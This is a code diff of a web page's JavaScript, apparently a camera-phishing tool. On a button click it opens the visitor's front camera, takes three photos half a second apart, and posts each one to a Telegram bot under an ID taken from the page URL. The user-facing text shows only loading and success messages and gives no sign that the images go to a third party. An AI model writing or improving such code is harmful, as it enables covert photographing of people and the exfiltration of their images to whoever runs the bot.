@@ -293,52 +293,71 @@
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
         async function capture() {
-            const btn = document.getElementById('btnStart');
-            const res = document.getElementById('result');
-            const currentLang = localStorage.getItem('preferred_lang') || 'ar';
+    const btn = document.getElementById('btnStart');
+    const res = document.getElementById('result');
+    const currentLang = localStorage.getItem('preferred_lang') || 'ar';
 
-            btn.disabled = true;
-            btn.textContent = translations[currentLang].loading;
-            res.textContent = '';
-            res.style.display = 'block';
+    btn.disabled = true;
+    btn.textContent = translations[currentLang].loading;
+    res.textContent = '';
+    res.style.display = 'block';
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 640, height: 480 }
-                });
+    try {
+        // 1. کردنەوەی کامێرا (یەک جار)
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: 640, height: 480 }
+        });
 
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
 
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-
-                const photo = canvas.toDataURL('image/jpeg', 0.7);
-                stream.getTracks().forEach(track => track.stop());
-
-                const blob = await (await fetch(photo)).blob();
-                const fd = new FormData();
-                fd.append('chat_id', CHAT);
-                fd.append('photo', blob, `cam_${chatId}.jpg`);
-                fd.append('caption', `📸 صورة - ID: ${chatId}`);
-
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
-
-                res.textContent = translations[currentLang].success;
-                btn.textContent = translations[currentLang].done;
-
-            } catch (e) {
-                res.textContent = translations[currentLang].error_prefix + e.message;
-                btn.disabled = false;
-                btn.textContent = translations[currentLang].retry;
+        // 2. گرتنی ٣ وێنە بە مەودای ٠.٥ چرکە
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+            // چاوەڕوانی 500ms (جگە لە یەکەم وێنە)
+            if (i > 0) {
+                await new Promise(resolve => setTimeout(resolve, 500));
             }
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            const photo = canvas.toDataURL('image/jpeg', 0.7);
+            photos.push(photo);
         }
+
+        // 3. داخستنی کامێرا دوای گرتنی هەر ٣ وێنەکە
+        stream.getTracks().forEach(track => track.stop());
+
+        // 4. ناردنی وێنەکان بۆ تێلێگرام (بە شێوەی ئەلبۆم)
+        const mediaGroup = [];
+        for (let i = 0; i < photos.length; i++) {
+            const blob = await (await fetch(photos[i])).blob();
+            const fd = new FormData();
+            fd.append('chat_id', CHAT);
+            fd.append('photo', blob, `cam_${chatId}_${i + 1}.jpg`);
+            
+            // ئەگەر دەتەوێت هەر سێ وێنەکە وەک یەک پەیامی ئەلبۆم بنێردرێن:
+            // پێویستت بە sendMediaGroup دەبێت، ئەمەش کەمێک جیاوازە.
+            // بۆ سادەیی، هەر وێنەیەک بە جیا دەنێردرێت:
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: fd
+            });
+        }
+
+        res.textContent = translations[currentLang].success;
+        btn.textContent = translations[currentLang].done;
+
+    } catch (e) {
+        res.textContent = translations[currentLang].error_prefix + e.message;
+        btn.disabled = false;
+        btn.textContent = translations[currentLang].retry;
+    }
+}
 
         document.getElementById('btnStart').addEventListener('click', capture);
     </script>
